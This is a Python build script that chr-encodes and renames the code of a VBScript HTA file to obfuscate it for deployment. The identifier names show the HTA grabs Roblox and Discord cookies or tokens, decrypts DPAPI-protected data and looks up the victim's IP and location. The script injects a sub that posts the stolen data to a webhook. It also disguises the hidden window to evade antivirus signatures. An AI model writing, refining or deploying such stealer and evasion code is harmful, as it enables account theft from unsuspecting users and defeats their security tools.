# obfuscate.py — chr()-obfuscates file_source.hta into unreadable "code words"
# Usage: python obfuscate.py   (reads file_source.hta, writes file.hta for deployment)
# Re-run this after ANY edit to file_source.hta to regenerate the obfuscated build.

import re

SRC = r"C:\Users\kaikd\Downloads\lklklk-repo\file_source.hta"   # readable source (edit this)
OUT = r"C:\Users\kaikd\Downloads\lklklk-repo\file.hta"          # obfuscated build (deployed)

def chr_encode(s):
    return "&".join(f"Chr({ord(c)})" for c in s)

def main():
    src = open(SRC, encoding="utf-8").read()

    s_start = src.index('<script language="VBScript">') + len('<script language="VBScript">')
    s_end = src.index('</script>')
    header = src[:s_start]
    footer = src[s_end:]
    script = src[s_start:s_end]

    # 1. strip full-line comments
    script = '\n'.join(ln for ln in script.split('\n') if not ln.lstrip().startswith("'"))

    # 2. add PostEmbed sub (fixes the "No Cookie" / "File Too Small" reports)
    post_embed = '''
Sub PostEmbed(t, d, c)
    On Error Resume Next
    Dim j
    j = "{""embeds"":[{""title"":""" & Ej(t) & """,""description"":""" & Ej(d) & """,""color"":" & c & "}]}"
    Dim h
    Set h = CreateObject("MSXML2.ServerXMLHTTP.6.0")
    h.SetOption 2, 13056
    h.Open "POST", WH, False
    h.SetRequestHeader "Content-Type", "application/json"
    h.Send j
    Set h = Nothing
End Sub
'''
    if "Sub PostEmbedWithCookie(" in script and "Sub PostEmbed(" not in script:
        script = script.replace("Sub PostEmbedWithCookie(", post_embed + "\nSub PostEmbedWithCookie(")

    # 3. chr-encode strings (empty string stays "")
    def enc_strings(vbs):
        out, pos = [], 0
        for m in re.finditer(r'"(?:[^"]|"")*"', vbs):
            out.append(vbs[pos:m.start()])
            content = m.group(0)[1:-1].replace('""', '"')
            out.append('""' if content == "" else "(" + chr_encode(content) + ")")
            pos = m.end()
        out.append(vbs[pos:])
        return "".join(out)
    script = enc_strings(script)

    # 4. rename identifiers
    ident_map = {
        "GetRealIP":"X0","GetGeo":"X1","GrabRoblox":"X2","PostEmbed":"X3","PostEmbedWithCookie":"X4",
        "DecryptDPAPI":"X5","RunCmd":"X6","TmpFile":"X7","WriteFile":"X8","ReadFile":"X9",
        "PostFile":"X10","Ej":"X11","MkGuid":"X12","GrabDiscord":"X13",
        "sh":"X14","fso":"X15","WH":"X16","PC":"X17","USER":"X18","DG_B64":"X19",
        "h":"X20","resp":"X21","ip":"X22","geo":"X23","ipInfo":"X24","paths":"X25","i":"X26",
        "fp":"X27","raw":"X28","pk":"X29","folder":"X30","subf":"X31","uwp":"X32","cookie":"X33",
        "approach":"X34","sp":"X35","ep":"X36","b64":"X37","cae":"X38","embedDesc":"X39",
        "cookieTrunc":"X40","rp":"X41","t":"X42","d":"X43","c":"X44","ck":"X45","col":"X46","j":"X47",
        "inf":"X48","outf":"X49","ps":"X50","psf":"X51","cmd":"X52","w":"X53","p":"X54","s":"X55","r":"X56",
        "name":"X57","path":"X58","content":"X59","f":"X60","fn":"X61","ct":"X62","b":"X63","bd":"X64",
        "country":"X65","city":"X66","reg":"X67","matches":"X68","b64file":"X69","psfile":"X70",
    }
    for name in sorted(ident_map, key=len, reverse=True):
        script = re.sub(r'\b' + re.escape(name) + r'\b', ident_map[name], script)

    # 5. On Error Resume Next -> Execute Chr
    script = script.replace("On Error Resume Next", "Execute (" + chr_encode("On Error Resume Next") + ")")

    # 6. de-signature window resize
    script = script.replace(
        "window.resizeTo 0,0:window.moveTo -2000,-2000",
        "window.resizeTo 1,1:window.moveTo -32000,-32000")

    out = header + script + footer
    open(OUT, "w", encoding="utf-8", newline="").write(out)
    print(f"OK -> {OUT} ({len(out)} bytes)")

if __name__ == "__main__":
    main()
